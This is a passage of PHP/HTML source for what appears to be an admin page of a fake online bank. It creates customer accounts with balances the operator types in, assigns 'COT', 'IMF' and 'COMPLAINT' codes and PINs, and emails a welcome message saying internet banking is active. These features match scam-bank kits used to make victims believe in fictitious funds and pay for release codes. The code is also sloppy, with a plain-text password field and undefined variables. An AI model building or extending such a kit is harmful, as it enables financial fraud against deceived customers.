												<td class='column' width='100%' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt; font-weight: 400; text-align: left; vertical-align: top; padding-top: 5px; padding-bottom: 5px; border-top: 0px; border-right: 0px; border-bottom: 0px; border-left: 0px;'>
													<table class='divider_block' width='100%' border='0' cellpadding='10' cellspacing='0' role='presentation' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt;'>
														<tr>
															<td>
																<div align='center'>
																	<table border='0' cellpadding='0' cellspacing='0' role='presentation' width='100%' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt;'>
																		<tr>
																			<td class='divider_inner' style='font-size: 1px; line-height: 1px; border-top: 1px solid #BBBBBB;'><span>&#8202;</span></td>
																		</tr>
																	</table>
																</div>
															</td>
														</tr>
													</table>
												</td>
											</tr>
										</tbody>
									</table>
								</td>
							</tr>
						</tbody>
					</table>
					<table class='row row-14' align='center' width='100%' border='0' cellpadding='0' cellspacing='0' role='presentation' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt; background-color: #161313;'>
						<tbody>
							<tr>
								<td>
									<table class='row-content stack' align='center' border='0' cellpadding='0' cellspacing='0' role='presentation' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt; color: #000000; width: 500px;' width='500'>
										<tbody>
											<tr>
												<td class='column' width='100%' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt; font-weight: 400; text-align: left; vertical-align: top; padding-top: 25px; padding-bottom: 25px; border-top: 0px; border-right: 0px; border-bottom: 0px; border-left: 0px;'>
													<table class='text_block' width='100%' border='0' cellpadding='10' cellspacing='0' role='presentation' style='mso-table-lspace: 0pt; mso-table-rspace: 0pt; word-break: break-word;'>
														<tr>
															<td>
																<div style='font-family: sans-serif'>
																	<div style='font-size: 14px; mso-line-height-alt: 16.8px; color: #393d47; line-height: 1.2; font-family: Arial, Helvetica Neue, Helvetica, sans-serif;'>
																		<p style='margin: 0;'><span style='color:#ffffff;'>Please, note that your Internet Banking is automatically activated and you will need a combination of your account number and password to access your online banking.</span></p>
																	</div>
																</div>
															</td>
														</tr>
													</table>
												</td>
											</tr>
										</tbody>
									</table>
								</td>
							</tr>
						</tbody>
					</table>
				</td>
			</tr>
		</tbody>
	</table><!-- End -->
</body>

</html>

";


            $subject = "Welcome $fname - Your Account Has Been Created!";




            $send_otp_mobile = preg_replace('/[^0-9]/', '', $_POST['phone']);
            $reg_user->send_mail($email, $messag, $subject);
            //$reg_user->otp($send_otp_mobile, $subject);





            $msg1 = "
					<div class='alert alert-info'>
						<button class='close' data-dismiss='alert'>&times;</button>
						<strong>Success!</strong> Account Has Been Successfully Created!
                   
			  		</div>
					";
        } else {
            echo "Sorry , Query could no execute...";
        }
    }
}
?>


 <?php include 'headeradmin.php'; ?>
 
 <?php include 'count.php'; ?>
 
 <!---begin of Mobile View Here   only from Digital Forest Team-->
 
       <?php include 'menu.php'; ?>
  
  <!---End of Mobile View Here   only from Digital Forest Team-->
  
  

     
     
     
  
    <div class="container-fluid mt--7">
     <!-- Table -->
      <div class="row">
        <div class="col">
          <div class="card shadow" >
            <div class="card-header border-0">
              <h3 class="mb-0"><a href=""   class="btn btn-danger">REGISTER NEW USER HERE</a></h3>
            </div>
           
             
           <form role="form" style="width:98%; padding-left:15px; "  method="POST" enctype="multipart/form-data">
                    <?php if (isset($msg1)) echo $msg1; ?>
                      <?php if (isset($msg)) echo $msg; ?>
                    <div class="row">
                        <div class="col-md-3 form-group">
                            <label>First Name</label>
                            <input type="text" name="fname" class="input-sm validate[required] form-control" placeholder="First Name">
                        </div>
                        <div class="col-md-3 form-group">
                            <label>Middle Name (Optional)</label>
                            <input type="text" name="mname" class="input-sm form-control" placeholder="Middle Name">
                        </div>
                        <div class="col-md-3 form-group">
                            <label>Last Name</label>
                            <input type="text" name="lname" class="input-sm validate[required] form-control" placeholder="Last Name">
                        </div>
                        <div class="col-md-3 form-group">
                            <label>Username</label>
                            <input type="text" name="uname" class="input-sm validate[required] form-control" placeholder="Username">
                        </div>
                    </div>
                    <div class="row">
                        <div class="col-md-3 form-group">
                            <label>Password</label>
                            <input type="text" name="upass" class="input-sm validate[required] form-control" placeholder="Password">
                        </div>
                        <div class="col-md-3 form-group">
                            <label>Occupation</label>
                            <input type="text" name="work" class="input-sm validate[required] form-control" placeholder="Occupation">
                        </div>
                        <div class="col-md-3 form-group">
                            <label>Phone(Type without +)</label>
                            <input type="text" name="phone" class="input-sm validate[required] form-control" placeholder="Eg 2341234567786">
                        </div>
                        <div class="col-md-3 form-group">
                            <label>Email</label>
                            <input type="email" name="email" class="input-sm validate[required] form-control" placeholder="Email">
                        </div>

                    </div>
                    <div class="row">
                         <div class="form-group col-md-3">
                            <label>Address</label>
                            <textarea name="addr" class="input-sm validate[required] form-control" placeholder="House or Office Address"></textarea>
                        </div>
                       
                        
                         <div class="col-md-3 form-group">
                            <label>Security Question</label>
                            <input type="text" name="secretq" class="input-sm validate[required] form-control" placeholder="Security Question">
                        </div>
                        
                         <div class="col-md-3 form-group">
                            <label>Security Question Answer</label>
                            <input type="text" name="secretans" class="input-sm validate[required] form-control" placeholder="Security Question Answer">
                        </div>
                         <div class="col-md-2 form-group" id="date-time">
                              <label>Date of Birth</label>
                            <div class="input-icon datetime-pick date-only">
                                <input data-format="dd/MM/yyyy" name="dob" type="text" placeholder="Select Date of Birth" class="form-control input-sm" />
                                <span class="add-on">
                                    <i class="sa-plus"></i>
                                </span>
                            </div>
                        </div>

                        <div class="col-md-2 form-group">
                            <label>Marital Status</label>
                            <select name="marry" class="form-control input-sm validate[required]">
                                <option value="Single">Single</option>
                                <option value="Married">Married</option>
                                <option value="Widowed">Widowed</option>
                                <option value="Divorced">Divorced</option>
                            </select>
                        </div>
                         <div class="col-md-2 form-group">
                            <label>Next of Kin</label>
                            <input type="text" name="nextkin" class="input-sm validate[required] form-control" placeholder="Next of Kin">
                        </div>
                        <div class="col-md-3 form-group">
                            <label>Next of kin Relationship</label>
                            <input type="text" name="nextkinre" class="input-sm validate[required] form-control" placeholder="Next of kin Relationship: Daughter,son ...">
                        </div>
                        <div class="col-md-2 form-group">
                            <label>Gender</label>
                            <select  name="sex" class="form-control input-sm validate[required]">
                                <option value="Male">Male</option>
                                <option value="Female">Female</option>
                                <option value="Other">Other</option>
                            </select>
                        </div>
                       
                        <div class="col-md-2 form-group">
                            <label>Account Type</label>
                            <select name="type" class="form-control input-sm validate[required]">
                                <option value="Savings">Savings</option>
                                <option value="Current">Current</option>
                                 <option value="Checking">Checking</option>
                                <option value="Fixed Deposit">Fixed Deposit</option>
                                 <option value="NON-Resident">NON-Resident</option>
                                <option value="Online Banking">Online Banking</option>
                                 <option value="Joint Account">Joint Account</option>
                                <option value="DOMICILIARY ACCOUNT">DOMICILIARY ACCOUNT</option>
                            </select>
                        </div>
                    </div>
                    <div class="row">
                        
                        <div class="col-md-2 form-group" id="date-time">

                            <label>Registration Date</label>
                            <div class="input-icon datetime-pick date-only">
                                <input data-format="dd/MM/yyyy" name="reg_date" type="text" placeholder="Select Reg Date" class="form-control input-sm" />
                                <span class="add-on">
                                    <i class="sa-plus"></i>
                                </span>
                            </div>
                        </div>
                        
                       <div class="col-md-3 form-group">
                            <label>Account Currency</label>
                            <select class="input-sm validate[required] form-control" name="currency">
                        
                               <option value="">--Select Currency--</option>
<option value="AFN">Afghanistan Afghanis – AFN</option>
<option value="ALL">Albania Leke – ALL</option>
<option value="DZD">Algeria Dinars – DZD</option>
<option value="ARS">Argentina Pesos – ARS</option>
<option value="AUD">Australia Dollars – AUD</option>
<option value="ATS">Austria Schillings – ATS</OPTION>
 
<option value="BSD">Bahamas Dollars – BSD</option>
<option value="BHD">Bahrain Dinars – BHD</option>
<option value="BDT">Bangladesh Taka – BDT</option>
<option value="BBD">Barbados Dollars – BBD</option>
<option value="BEF">Belgium Francs – BEF</OPTION>
<option value="BMD">Bermuda Dollars – BMD</option>
 
<option value="BRL">Brazil Reais – BRL</option>
<option value="BGN">Bulgaria Leva – BGN</option>
<option value="CAD">Canada Dollars – CAD</option>
<option value="XOF">CFA BCEAO Francs – XOF</option>
<option value="XAF">CFA BEAC Francs – XAF</option>
<option value="CLP">Chile Pesos – CLP</option>
 
<option value="CNY">China Yuan Renminbi – CNY</option>
<option value="CNY">RMB (China Yuan Renminbi) – CNY</option>
<option value="COP">Colombia Pesos – COP</option>
<option value="XPF">CFP Francs – XPF</option>
<option value="CRC">Costa Rica Colones – CRC</option>
<option value="HRK">Croatia Kuna – HRK</option>
 
<option value="CYP">Cyprus Pounds – CYP</option>
<option value="CZK">Czech Republic Koruny – CZK</option>
<option value="DKK">Denmark Kroner – DKK</option>
<option value="DEM">Deutsche (Germany) Marks – DEM</OPTION>
<option value="DOP">Dominican Republic Pesos – DOP</option>
<option value="NLG">Dutch (Netherlands) Guilders – NLG</OPTION>
 
<option value="XCD">Eastern Caribbean Dollars – XCD</option>
<option value="EGP">Egypt Pounds – EGP</option>
<option value="EEK">Estonia Krooni – EEK</option>
<option value="EUR">Euro – EUR</option>
<option value="FJD">Fiji Dollars – FJD</option>
<option value="FIM">Finland Markkaa – FIM</OPTION>
 
<option value="FRF*">France Francs – FRF*</OPTION>
<option value="DEM">Germany Deutsche Marks – DEM</OPTION>
<option value="XAU">Gold Ounces – XAU</option>
<option value="GRD">Greece Drachmae – GRD</OPTION>
<option value="GTQ">Guatemalan Quetzal – GTQ</OPTION>
<option value="NLG">Holland (Netherlands) Guilders – NLG</OPTION>
<option value="HKD">Hong Kong Dollars – HKD</option>
 
<option value="HUF">Hungary Forint – HUF</option>
<option value="ISK">Iceland Kronur – ISK</option>
<option value="XDR">IMF Special Drawing Right – XDR</option>
<option value="INR">India Rupees – INR</option>
<option value="IDR">Indonesia Rupiahs – IDR</option>
<option value="IRR">Iran Rials – IRR</option>
 
<option value="IQD">Iraq Dinars – IQD</option>
<option value="IEP*">Ireland Pounds – IEP*</OPTION>
<option value="ILS">Israel New Shekels – ILS</option>
<option value="ITL*">Italy Lire – ITL*</OPTION>
<option value="JMD">Jamaica Dollars – JMD</option>
<option value="JPY">Japan Yen – JPY</option>
 
<option value="JOD">Jordan Dinars – JOD</option>
<option value="KES">Kenya Shillings – KES</option>
<option value="KRW">Korea (South) Won – KRW</option>
<option value="KWD">Kuwait Dinars – KWD</option>
<option value="LBP">Lebanon Pounds – LBP</option>
<option value="LUF">Luxembourg Francs – LUF</OPTION>
 
<option value="MYR">Malaysia Ringgits – MYR</option>
<option value="MTL">Malta Liri – MTL</option>
<option value="MUR">Mauritius Rupees – MUR</option>
<option value="MXN">Mexico Pesos – MXN</option>
<option value="MAD">Morocco Dirhams – MAD</option>
<option value="NLG">Netherlands Guilders – NLG</OPTION>
 
<option value="NZD">New Zealand Dollars – NZD</option>
<option value="NOK">Norway Kroner – NOK</option>
<option value="OMR">Oman Rials – OMR</option>
<option value="PKR">Pakistan Rupees – PKR</option>
<option value="XPD">Palladium Ounces – XPD</option>
<option value="PEN">Peru Nuevos Soles – PEN</option>
 
<option value="PHP">Philippines Pesos – PHP</option>
<option value="XPT">Platinum Ounces – XPT</option>
<option value="PLN">Poland Zlotych – PLN</option>
<option value="PTE">Portugal Escudos – PTE</OPTION>
<option value="QAR">Qatar Riyals – QAR</option>
<option value="RON">Romania New Lei – RON</option>
 
<option value="ROL">Romania Lei – ROL</option>
<option value="RUB">Russia Rubles – RUB</option>
<option value="SAR">Saudi Arabia Riyals – SAR</option>
<option value="XAG">Silver Ounces – XAG</option>
<option value="SGD">Singapore Dollars – SGD</option>
<option value="SKK">Slovakia Koruny – SKK</option>
 
<option value="SIT">Slovenia Tolars – SIT</option>
<option value="ZAR">South Africa Rand – ZAR</option>
<option value="KRW">South Korea Won – KRW</option>
<option value="ESP">Spain Pesetas – ESP</OPTION> 
 
<option value="SDD">Sudan Dinars – SDD</option>
<option value="SEK">Sweden Kronor – SEK</option>
<option value="CHF">Switzerland Francs – CHF</option>
<option value="TWD">Taiwan New Dollars – TWD</option>
<option value="THB">Thailand Baht – THB</option>
<option value="TTD">Trinidad and Tobago Dollars – TTD</option>
 
<option value="TND">Tunisia Dinars – TND</option>
<option value="TRY">Turkey New Lira – TRY</option>
<option value="AED">United Arab Emirates Dirhams – AED</option>
<option value="GBP">United Kingdom Pounds – GBP</option>
<option value="USD">United States Dollars – USD</option>
<option value="VEB">Venezuela Bolivares – VEB</option>
 
<option value="VND">Vietnam Dong – VND</option>
<option value="ZMK">Zambia Kwacha – ZMK</option>

                            </select>
                        </div>
                        
                        <div class="col-md-2 form-group">
                            <label>Total Balance</label>
                            <input type="number" name="t_bal" class="input-sm validate[required] form-control" placeholder="Total Balance">
                        </div>
                        <div class="col-md-2 form-group">
                            <label>Available Balance</label>
                            <input type="number" name="a_bal" class="input-sm validate[required] form-control" placeholder="Available Balance">
                        </div>
                        <div class="col-md-2 form-group">
                            <label>Account Number</label>
                          <input type="number" class="input-sm validate[required] form-control"  name="acc_no"  id="acc_no" 
                             
                             value="<?php 
														//Variables
															 
															$DesdeNumero2 = 1;
															$HastaNumero2 = 1;
															$DesdeNumero3 = 10;
															$HastaNumero3 = 10;
															$DesdeNumero = 1;
															$HastaNumero = 10000000000;										
															$letraAleatoria = ($DesdeLetra);
															$letraAleatoria1 = ($DesdeLetra1);
															$letraAleatoria2 = ($DesdeLetra2);
															$numeroAleatorio2 = chr(rand(ord($DesdeNumero2), ord($HastaNumero2)));
															$numeroAleatorio3 = ($DesdeNumero3);
															$numeroAleatorio = rand($DesdeNumero, $HastaNumero);
														
														echo "".$letraAleatoria."".$letraAleatoria1."".$letraAleatoria2."".$numeroAleatorio."";?>" />
                        
                    </div></div>
                     
                    <div class="row"><div class="col-md-2 form-group">
                            <label>COT Code</label>
                            <input type="text" name="cot" class="input-sm validate[required] form-control" placeholder="Assign COT Code">
                        </div>

                        <div class="col-md-2 form-group">
                            <label>IMF Code</label>
                            <input type="text" name="tax" class="input-sm validate[required] form-control" placeholder="Assign IMF Code">
                        </div>

                        <div class="col-md-2 form-group">
                            <label>COMPLAINT Code</label>
                            <input type="text" name="imf" class="input-sm validate[required] form-control" placeholder="Assign COMPLAINT Code">
                        </div>
                        
                        <div class="col-md-2 form-group">
                            <label>LOGIN PIN/ATM PIN</label>
                            <input type="text" name="pin_auth" class="input-sm validate[required] form-control" placeholder="Assign Auth PIN Code">
                        </div>
                             <div class="col-md-3 form-group">
                            <label>DOMESTIC TRANSFER PIN</label>
                            <input type="text" name="pin" class="input-sm validate[required] form-control" placeholder="Assign PIN Code">
                        </div>

                        
                        
                         <div class="col-md-2 form-group">
                            <label></label>
                            
                        </div>
                    </div>
                    
                         <div class="col-md-2 form-group">
                           
                            <input type="text" name="verify" class="input-sm validate[required] form-control" value="Y" hidden>
                        </div>
            
             
            <input class="btn btn-md btn-info " type="reset" value="Reset">
            <input class="btn btn-info btn-md" type="submit" name="create" value="Register">
            
            
            </div>


  
            

            </form>
             
 
        
        </div>
      </div>
     
       <?php include 'foot.php'; ?>